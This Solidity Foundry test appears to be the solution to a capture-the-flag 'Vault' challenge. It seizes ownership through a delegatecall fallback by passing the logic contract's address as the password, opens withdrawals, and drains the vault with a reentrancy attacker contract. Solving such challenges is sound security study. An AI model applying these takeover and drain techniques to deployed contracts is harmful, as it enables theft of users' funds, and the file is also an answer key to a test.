// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Vault.sol";




contract ReentrancyAttacker {
    Vault public target;

    constructor(Vault _target) {
        target = _target;
    }

    // Kick off the attack by depositing and immediately withdrawing to trigger reentrancy
    function attack() external payable {
        target.deposite{value: msg.value}();
        target.withdraw();
    }

    receive() external payable {
        // Reenter while there is still balance to drain
        if (address(target).balance > 0) {
            target.withdraw();
        }
    }
}

contract VaultExploiter is Test {
    Vault public vault;
    VaultLogic public logic;

    address owner = address (1);
    address palyer = address (2);

    function setUp() public {
        vm.deal(owner, 1 ether);

        vm.startPrank(owner);
        logic = new VaultLogic(bytes32("0x1234"));
        vault = new Vault(address(logic));

        vault.deposite{value: 0.1 ether}();
        vm.stopPrank();

    }

    function testExploit() public {
        vm.deal(palyer, 1 ether);
        vm.startPrank(palyer);

        // 1) 获取所有权 打开提现开关
        bytes32 pass = bytes32(uint256(uint160(address(logic))));
        bytes memory payload = abi.encodeWithSignature(
            "changeOwner(bytes32,address)", pass, palyer
        );
        (bool ok,) = address(vault).call(payload); // hits Vault.fallback -> delegatecall to logic.changeOwner
        require(ok, "delegatecall changeOwner failed");

        // 2) 现在作为所有者，打开提款
        vault.openWithdraw();

        // 3) 部署攻击者并通过重入耗尽所有资金
        ReentrancyAttacker attacker = new ReentrancyAttacker(vault);
        attacker.attack{value: 0.1 ether}();
       
        // 4) Check solved: vault balance should be 0
        require(vault.isSolve(), "not solved");
        vm.stopPrank();
    }

}
